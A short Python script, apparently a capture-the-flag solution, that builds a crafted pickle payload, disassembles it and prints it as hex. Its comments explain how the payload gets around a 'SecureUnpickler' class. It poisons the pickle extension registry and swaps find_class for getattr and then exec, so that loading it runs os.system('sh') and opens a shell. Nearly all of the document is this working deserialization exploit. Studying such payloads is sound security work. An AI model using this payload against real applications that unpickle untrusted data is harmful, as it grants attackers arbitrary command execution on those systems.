from pickletools import dis
data = b'''\x80\4c__main__\npickle\n\x940c__main__\n__main__\n\x94c__main__\n__builtins__\nb0c__main__\nSecureUnpickler\nN}Vfind_class\nc__main__\ngetattr\ns\x86bh\0}V_inverted_registry\n}K\1h\1Vexec\n\x86sK\2Vimport os; os.system('sh')\n\x85ssb0\x82\1\x940N}Vfind_class\nh\2s\x86b0\x82\2.'''
dis(data)

print('-'*50)
print(data.hex())

# Strategy:
#  - GLOBAL __main__.pickle
#  - GLOBAL __main__.__main__
#  - GLOBAL __main__.__builtins__
#  - BUILD  __main__.__dict__ |= __main__.__builtins__
#  - GLOBAL __main__.SecureUnpickler
#  - GLOBAL __main__.getattr
#  - BUILD  SecureUnpickler.find_class = getattr
#  - BUILD  pickle._inverted_registry = { 1: (__main__, "exec"), 2: ("import os; os.system('sh')",) }
#  - EXT1   1
#  - BUILD  SecureUnpickler.find_class = exec
#  - EXT1   2